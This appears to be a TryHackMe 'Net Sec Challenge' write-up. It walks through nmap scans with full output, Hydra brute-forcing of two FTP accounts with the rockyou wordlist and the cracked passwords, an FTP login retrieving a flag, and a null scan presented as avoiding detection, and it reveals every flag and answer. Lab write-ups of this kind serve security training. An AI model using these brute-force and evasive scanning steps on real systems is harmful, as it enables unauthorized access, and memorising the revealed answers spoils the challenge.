# Net Sec Challenge

## Net Sec Challenge

![](https://raw.githubusercontent.com/Adel-Ahmed777/TryHackMe-Writeups/main/TryHackMe%20Images/Net%20Sec%20Challenge%20Screenshot.png)

## Task 2

#### First I ran the following nmap scan

```
nmap -sC -sV -Pn -p- -vv 10.10.65.131
```

* \-sC = use the default script
* \-sV = Enable version detection
* \-Pn = Treat all hosts as online and skip host discovery
* \-p- = Scan all ports

Results:

```
Not shown: 65527 closed tcp ports (conn-refused)
PORT      STATE    SERVICE     REASON      VERSION
22/tcp    open     ssh         syn-ack     (protocol 2.0)
| ssh-hostkey:
|   3072 da:5f:69:e2:11:1f:7c:66:80:89:61:54:e8:7b:16:f3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDI/lsJvB7tVnxblzcauj2/zvS2sREr9M28uEKQoWcfewzEn0gKyB8NJ5IRm+VxmgOAQpebzqZjZ+Wx9Ahd+gFRjpCvKCpLvxT58YK2thQrzyeT8HY03f7lhNBgUdLm/3gNcqV4cGO6PcxoWvxYIbbM98oiiAiWKBfzHocWAEh85bvY0E7ftelUp4P8DG2f0jERy2VMwEWzSzbB0DUSaasH57RJsNYQBE5jBdCwDbasaI5P04WHDCPk2wu9sc0MukhyDidK1/kWCdLHycfKGOWYC2XyCunGfiD1ynljDrRaqgagdjvfjHka81Ol17J00ILKyfM88yYqEeUCFAnQncTDPwIC7QTAPqKsw9fGWGdEYmo6Jur+v406kk/6xTQ2eOj+S1hD9ahzWFIy2MwrrwmFn3Hcb7/xfCw5rZJIVZWaoSWQYO71kGgoWAJZzKHziv0NUkgofTFpQGWthveIIMx1PNPdaIUH5M0/gbk5XscdbYjFuOFP5canSOQuxG8Prt8=
|   256 3f:8c:09:46:ab:1c:df:d7:35:83:cf:6d:6e:17:7e:1c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP1eIIFNNbSO2weyRY0pHKChu4RtCBTyhTjMOCSW/lRlmcZv1Glitrms3x2WQQ4CWjHw2XalVZvRursXCcUEOnQ=
|   256 ed:a9:3a:aa:4c:6b:16:e6:0d:43:75:46:fb:33:b2:29 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA+Y0H+tldbG0k08Zkd3Lx1oBTlLh2KXyzS0lInfZmRp
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
80/tcp    open     http        syn-ack     lighttpd
|_http-server-header: lighttpd THM{web_server_25352}
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Hello, world!
139/tcp   open     netbios-ssn syn-ack     Samba smbd 4.6.2
445/tcp   open     netbios-ssn syn-ack     Samba smbd 4.6.2
8080/tcp  open     http        syn-ack     Node.js (Express middleware)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
10021/tcp open     ftp         syn-ack     vsftpd 3.0.3
29373/tcp filtered unknown     no-response
32722/tcp filtered unknown     no-response
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port22-TCP:V=7.92%I=7%D=1/27%Time=61F28D34%P=x86_64-pc-linux-gnu%r(NULL
SF:,29,"SSH-2\.0-OpenSSH_8\.2p1\x20THM{946219583339}\r\n");
Service Info: OS: Unix

Host script results:
|_clock-skew: -1s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| nbstat: NetBIOS name: NETSEC-CHALLENG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   NETSEC-CHALLENG<00>  Flags: <unique><active>
|   NETSEC-CHALLENG<03>  Flags: <unique><active>
|   NETSEC-CHALLENG<20>  Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 14102/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 30963/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 35436/udp): CLEAN (Failed to receive data)
|   Check 4 (port 40517/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2022-01-27T12:16:59
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:17
Completed NSE at 23:17, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:17
Completed NSE at 23:17, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:17
Completed NSE at 23:17, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9467.12 seconds

```

#### What is the highest port number being open less than 10,000?

According to this part of the scan:

```
8080/tcp  open     http        syn-ack     Node.js (Express middleware)
```

**Answer**

<details>

<summary>CLICK TO REVEAL</summary>

```
8080
```

</details>

#### There is an open port outside the common 1000 ports; it is above 10,000. What is it?

According to this part of the scan:

```
10021/tcp open     ftp         syn-ack     vsftpd 3.0.3
```

**Answer**

<details>

<summary>CLICK TO REVEAL</summary>

```
10021
```

</details>

#### How many TCP ports are open?

These are the number of open TCP ports

```
22/tcp    open     ssh         syn-ack     (protocol 2.0)
80/tcp    open     http        syn-ack     lighttpd
139/tcp   open     netbios-ssn syn-ack     Samba smbd 4.6.2
445/tcp   open     netbios-ssn syn-ack     Samba smbd 4.6.2
8080/tcp  open     http        syn-ack     Node.js (Express middleware)
10021/tcp open     ftp         syn-ack     vsftpd 3.0.3
```

**Answer**

<details>

<summary>CLICK TO REVEAL</summary>

```
6
```

</details>

#### What is the flag hidden in the HTTP server header?

According to the HTTP section in the scan, the flag is

```
80/tcp    open     http        syn-ack     lighttpd
|_http-server-header: lighttpd THM{web_server_25352}
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Hello, world!
```

**Flag**

<details>

<summary>CLICK TO REVEAL</summary>

```
THM{web_server_25352}
```

</details>

#### What is the flag hidden in the SSH server header?

According to the SSH section in the scan \[last line], the flag is

```
22/tcp    open     ssh         syn-ack     (protocol 2.0)
| ssh-hostkey:
|   3072 da:5f:69:e2:11:1f:7c:66:80:89:61:54:e8:7b:16:f3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDI/lsJvB7tVnxblzcauj2/zvS2sREr9M28uEKQoWcfewzEn0gKyB8NJ5IRm+VxmgOAQpebzqZjZ+Wx9Ahd+gFRjpCvKCpLvxT58YK2thQrzyeT8HY03f7lhNBgUdLm/3gNcqV4cGO6PcxoWvxYIbbM98oiiAiWKBfzHocWAEh85bvY0E7ftelUp4P8DG2f0jERy2VMwEWzSzbB0DUSaasH57RJsNYQBE5jBdCwDbasaI5P04WHDCPk2wu9sc0MukhyDidK1/kWCdLHycfKGOWYC2XyCunGfiD1ynljDrRaqgagdjvfjHka81Ol17J00ILKyfM88yYqEeUCFAnQncTDPwIC7QTAPqKsw9fGWGdEYmo6Jur+v406kk/6xTQ2eOj+S1hD9ahzWFIy2MwrrwmFn3Hcb7/xfCw5rZJIVZWaoSWQYO71kGgoWAJZzKHziv0NUkgofTFpQGWthveIIMx1PNPdaIUH5M0/gbk5XscdbYjFuOFP5canSOQuxG8Prt8=
|   256 3f:8c:09:46:ab:1c:df:d7:35:83:cf:6d:6e:17:7e:1c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP1eIIFNNbSO2weyRY0pHKChu4RtCBTyhTjMOCSW/lRlmcZv1Glitrms3x2WQQ4CWjHw2XalVZvRursXCcUEOnQ=
|   256 ed:a9:3a:aa:4c:6b:16:e6:0d:43:75:46:fb:33:b2:29 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA+Y0H+tldbG0k08Zkd3Lx1oBTlLh2KXyzS0lInfZmRp
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
```

**Flag**

<details>

<summary>CLICK TO REVEAL</summary>

```
THM{946219583339}
```

</details>

#### We have an FTP server listening on a nonstandard port. What is the version of the FTP server?

According to this part of the scan:

```
10021/tcp open     ftp         syn-ack     vsftpd 3.0.3
```

**Answer**

<details>

<summary>CLICK TO REVEAL</summary>

```
vsftpd 3.0.3
```

</details>

#### We learned two usernames using social engineering: eddie and quinn. What is the flag hidden in one of these two account files and accessible via FTP?

On this machine FTP is running on port 10021. So, we will use Hydra and specify this port in the command for each username.

For eddie:

```
hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://10.10.65.131:10021
```

Login details for eddie:

```
[10021][ftp] host: 10.10.65.131   login: eddie   password: jordan

```

For quinn:

```
hydra -l quinn -P /usr/share/wordlists/rockyou.txt ftp://10.10.65.131:10021
```

Login details for quinn:

```
[10021][ftp] host: 10.10.65.131   login: quinn   password: andrea
```

Now we login to one of the users and check where is the hidden flag. I coudlnt find any thing on eddie's directory, so it must be on quinn's

```
ftp 10.10.65.131 10021
Connected to 10.10.65.131.
220 (vsFTPd 3.0.3)
Name (10.10.65.131:kali): quinn
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||30176|)
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002           18 Sep 20 08:27 ftp_flag.txt
226 Directory send OK.
ftp> get ftp_flag.txt
local: ftp_flag.txt remote: ftp_flag.txt
229 Entering Extended Passive Mode (|||30204|)
150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
100% |**************************************************************************|    18       12.14 KiB/s    00:00 ETA
226 Transfer complete.
18 bytes received in 00:00 (0.06 KiB/s)
ftp> exit
221 Goodbye.
```

**Flag**

<details>

<summary>CLICK TO REVEAL</summary>

```
THM{321452667098}
```

</details>

#### Browsing to http://10.10.209.253:8080 displays a small challenge that will give you a flag once you solve it. What is the flag?

The IP in this question is different than the rest becasue I had to reset the machine.

I used the **-sN** flag as this performs a null scan that allows you scan the machine without being detected. Or at least have the minimum amount of chance of being detected.

```
sudo nmap -sN  10.10.209.253      
```

![](https://raw.githubusercontent.com/Adel-Ahmed777/TryHackMe-Writeups/main/TryHackMe%20Images/nullscan-results.png)

**Flag**

<details>

<summary>CLICK TO REVEAL</summary>

```
THM{f7443f99}
```

</details>

## testing Gitbook
